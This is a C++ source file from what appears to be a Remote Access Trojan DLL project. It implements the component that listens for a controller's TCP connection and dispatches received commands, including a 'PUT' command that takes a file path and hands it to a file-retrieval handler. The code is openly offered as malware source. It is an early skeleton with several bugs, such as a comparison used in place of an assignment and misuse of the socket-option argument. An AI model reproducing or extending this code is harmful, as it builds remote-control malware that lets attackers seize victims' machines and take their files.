// Patrick Sacchet
// Verison 1.0
// RAT-Dll-Connect.cpp : This file contains functionality for handling our connection back to our C2 server

#include "RAT-Dll-Connect.h"


INT startListen()
{
    WORD wsaVersion;
    WSADATA wsaData;
    SOCKET clientSock, serverSock;
    SOCKADDR_IN client;
    INT status = SUCCESS;
    INT sendStatus = 0;
    INT recvBufLen = DEFAULT_BUF_LEN;
    INT bOptLen = sizeof(BOOL);
    BOOL bOptVal = FALSE;
    CHAR recvBuf[DEFAULT_BUF_LEN];
    CHAR msgBuf[DEFAULT_BUF_LEN];

    wsaVersion = MAKEWORD(2, 2);

    status = WSAStartup(wsaVersion, &wsaData);
    if (status != SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Failed WSAStartup! Error code %u\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    OutputDebugStringA("WSAStartup was successful! \n");

    // Information for target
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT_NUM);

    // Accept any IP address
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    clientSock = INVALID_SOCKET;

    serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to create socket! \n");
        status = WSAGetLastError();
        goto cleanup;
    }

    status = bind(serverSock, (LPSOCKADDR)&client, sizeof(client));
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to bind to socket! \n");
        status = WSAGetLastError();
        goto cleanup;
     }

    // Set keepalive for our server socket
    status == setsockopt(serverSock, SOL_SOCKET, SO_KEEPALIVE, (char*)bOptVal, bOptLen);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to set keepalive options! \n");
        status = WSAGetLastError();
        goto cleanup;
    }
        
    sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Listening on port %u\n", PORT_NUM);
    OutputDebugStringA(msgBuf);

    status = listen(serverSock, SOMAXCONN);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Socket error ! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    clientSock = accept(serverSock, NULL, NULL);
    if (clientSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Invalid socket from client! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    // Close server socket since we no longer need it 
    closesocket(serverSock);

    // Receive from client until the peer shuts down the connection
        // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
    do
    {
        printf("Waiting for more bytes... \n");
        status = recv(clientSock, recvBuf, recvBufLen, 0);
        if (status > 0)
        {
             printf("Bytes received: %d \n", status);
             printf("bytes: %s\n", &recvBuf);

             if (strcmp((const char*)&recvBuf, PUT) == 0)
             {
                 // Will have to receive again for the filepath OR put it in the same packet...
                    // Prob safer to break up packets, could add delays etc
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
                 if (status > 0)
                 {
                     char* fileBytes = NULL;
                     status = performGetFile((const char*)&recvBuf, fileBytes);
                     if (status != SUCCESS)
                     {
                         sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Failure recevied from performGetFile %d\n", status);
                         OutputDebugStringA(msgBuf);
                         goto cleanup;
                     }
                 }

                 
             }

             // check for other functionality 

             // dont need to worry about sending bytes back yet just read for our code and react as needed
             /**
            sendStatus = send(clientSock, recvBuf, status, 0);
            if (sendStatus == SOCKET_ERROR)
            {
                printf("Send error: %d \n", sendStatus);
                closesocket(clientSock);
                WSACleanup();
                return FALSE;
            }
            printf("Bytes sent: %d \n", sendStatus);
            */
        }
        else if (status == 0)
        {
            printf("Closing socket... \n");
        }
        else
        {
            printf("Recv failed with error %d \n", WSAGetLastError());
            closesocket(clientSock);
            WSACleanup();
            return FALSE;
        }

    } while (status > 0);

    // shutdown connection since we're done
    status = shutdown(clientSock, SD_SEND);
    if (status == SOCKET_ERROR)
    {
        printf("Shutdown failed with error: %d \n", WSAGetLastError());
        closesocket(clientSock);
        WSACleanup();
        return FALSE;
    }

    closesocket(clientSock);
    WSACleanup();

    // Parse initial packet data and call appropiate handler from here
cleanup:
    return status;
}